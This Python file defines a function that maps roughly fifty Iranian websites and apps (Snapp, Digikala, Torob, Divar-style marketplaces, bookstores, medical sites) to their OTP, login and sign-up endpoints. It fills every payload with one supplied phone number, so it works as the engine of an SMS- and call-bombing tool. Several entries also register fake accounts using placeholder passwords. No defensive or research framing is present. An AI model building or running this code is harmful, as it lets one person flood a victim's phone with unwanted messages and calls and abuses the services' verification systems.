def send_otp_requests(number):
    url_payload_map = {
        'snapp': ('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', {'cellphone': '0' + number}),
        'paaakar': ('https://api.paaakar.com/v1/customer/register-login?version=new1', {'mobile': '0' + number}),
        'ketabweb': ('https://ketabweb.com/login/?usernameCheck=1', {'username': '0' + number}),
        'azarbadbook': ('https://azarbadbook.ir/ajax/login_j_ajax_ver/', {'phone': number}),
        'cheshmandazketab': ('https://www.cheshmandazketab.ir/Register', {'phone': '0' + number,login:'1'}),
        'ketabir': ('https://sso-service.ketab.ir/api/v2/signup/otp?Mobile=0'+number+'&OtpSmsType=1', None),
        'snappshop': ('https://apix.snappshop.co/auth/v1/pre-login?lat=35.77331&lng=51.418591', {'mobile': '0' + number}),
        'pashikshoes': ('https://api.pashikshoes.com/v1/customer/register-login', {'mobile': '0' + number}),
        'shimashoes': ('https://shimashoes.com/api/customer/member/register/', { 'email': '0' + number}),
        'lendo': ('https://api.lendo.ir/api/customer/auth/send-otp', {'mobile': '0' + number}),
        'buskool': ('https://www.buskool.com/send_verification_code', {'phone': '0' + number}),
        'tamimpishro': ('https://www.tamimpishro.com/site/api/v1/user/otp', {'mobile': '0' + number}),
        'fafait': ('https://api2.fafait.net/oauth/check-user', {'id': '0' + number}),
        'sheypoor': ('https://www.sheypoor.com/api/v10.0.0/auth/send', {'username': '0' + number}),
        'itoll': ('https://app.itoll.com/api/v1/auth/login', {'mobile': '0' + number}),
        'banimode': ('https://mobapi.banimode.com/api/v2/auth/request', {'phone': '0' + number}),
        'torob': ('https://api.torob.com/v4/user/phone/send-pin', {'phone_number': '0' + number}),
        'basalam': ('https://auth.basalam.com/otp-request', {'mobile': '0' + number}),
        'khanoumi': ('https://www.khanoumi.com/accounts/sendotp', {'mobile': '0' + number, 'redirectUrl': ''}),
        'fankala': ('https://fankala.com/wp-admin/admin-ajax.php', {'action': 'verify_user_login', 'user': '0' + number, 'captcha': ''}),
        'arastag': ('https://arastag.ir/wp-admin/admin-ajax.php', {'action': 'verify_user_login', 'user': '0' + number, 'captcha': ''}),
        'drdr': ('https://drdr.ir/api/registerEnrollment/verifyMobile', {'phoneNumber': '0' + number, 'userType': 'PATIENT'}),
        'itoll': ('https://app.itoll.ir/api/v1/auth/login', {'mobile': '0' + number}),
        'telewebion': ('https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one', {'code': '98', 'phone': number, 'smsStatus': 'default'}),
        'gap': ('https://core.gap.im/v1/user/add.json', {'mobile': '+98' + number}),
        'caropex': ('https://caropex.com/api/v1/user/login', {'mobile': '0' + number}),
        'namava': ('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', {'UserName': '+98' + number}),
        'snappapps': ('https://api.snapp.ir/api/v1/sms/link', {'phone': '0' + number}),
        'novinmedical': ('https://novinmedical.com/wp-admin/admin-ajax.php', {'action': 'stm_login_register', 'type': 'mobile', 'input': '0' + number}),
        'hamrahsport': ('https://hamrahsport.com/send-otp', {'cell': number, 'name': 'persian_string', 'agree': '1', 'send_otp': '1', 'otp': ''}),
        'harikashop': ('https://harikashop.com/login?back=my-account', {
            'username': '0' + number,
            'id_customer': '',
            'back': ['', 'https://harikashop.com/login?back=my-account'],
            'firstname': 'persian_string',
            'lastname': 'persian_string',
            'password': 'random_password',
            'action': 'register',
            'ajax': '1'
        }),
        'zzzagros': ('https://www.zzzagros.com/wp-admin/admin-ajax.php', {
            'action': 'ywp_ajax_register',
            'ywp_register': '1',
            'ywp_reg_mobile': '0' + number,
            'ywp_reg_password': 'random_password',
            'ajax_woocommerce_register_nonce': ''
        }),
        'dalfak': ('https://www.dalfak.com/api/auth/sendVerificationCode', {
            'type': 1,
            'value': '0' + number
        }),

        'doctoreto': ('https://api.doctoreto.com/api/web/patient/v1/accounts/register', {
            'country_id': 205,
            'mobile': number
        }),
        'digikalacall': ('https://api.digikala.com/v1/user/authenticate/', {
            'backUrl': '/',
            'username': '0' + number,
            'otp_call': 'true'
        }),
        'okala': ('https://api-react.okala.com/C/CustomerAccount/OTPRegister', {
            'mobile': '0'+number,
            'deviceTypeCode' :0,
            'confirmTerms': 'true',
            'notRobot': 'false',
        }),
        'digikala': ('https://api.digikala.com/v1/user/authenticate/', {
            'backUrl': '/',
            'username': '0'+number,
            'otp_call': 'false'
        }),
        'novinmedical': ('https://novinmedical.com/wp-admin/admin-ajax.php', {
            'action': 'stm_login_register',
            'type': 'mobile',
            'input': '0'+number
        }),
        'mellishoes': ('https://mellishoes.ir/wp-admin/admin-ajax.php', {
            'action': 'websima_auth_account_detection',
            'account_detection_nonce_field': '21737b7e2d',
            'mobile': '0'+number,
            '_wp_http_referer':'/'
        }),
        'setshoe': ('https://setshoe.ir/wp-admin/admin-ajax.php', {
            'action': 'stm_login_register',
            'type': 'mobile',
            'input': '0'+number,
        }),
        'maxbax': ('https://maxbax.com/wp-admin/admin-ajax.php', {
            'action': 'bakala_send_code',
            'phone_email': '0'+number,
        }),
        'shikstyle': ('https://shik.style/wp-admin/admin-ajax.php', {
            'action': 'login',
            'form=phone': number,
        }),
        'parkbag': ('https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber', {
            'ReturnUrl': 'https://parkbag.com/',
            'MobaileNumber': number,
        }),
        'digistyle': ('https://www.digistyle.com/users/login-register/', {
            'loginRegister[email_phone]': '0' + number,
        }),
        'telketab': ('https://telketab.com/opt_field/check_secret', {
            'identity': '0' + number,
            'secret': '',
            'plugin': 'otp_field_sms_processor',
            'key': 'otp_field_user_auth_form__otp_sms',
        }),
        'adinehbook': ('https://www.adinehbook.com/gp/flex/sign-in.html', {
            'action': 'sign',
            'phone_cell_or_email': '0' + number,
        }),
        'gitamehr': ('https://gitamehr.ir/wp-admin/admin-ajax.php', {
            'action': 'stm_login_register',
            'type': 'mobile',
            'input': '0' + number,
        }),
        'sunnybook': ('https://sunnybook.ir/Home/RegisterUser', {
            'name': 'Mr',
            'password': '123456',
            'mobile': number,
        }),
        
    }

    return list(url_payload_map.values())
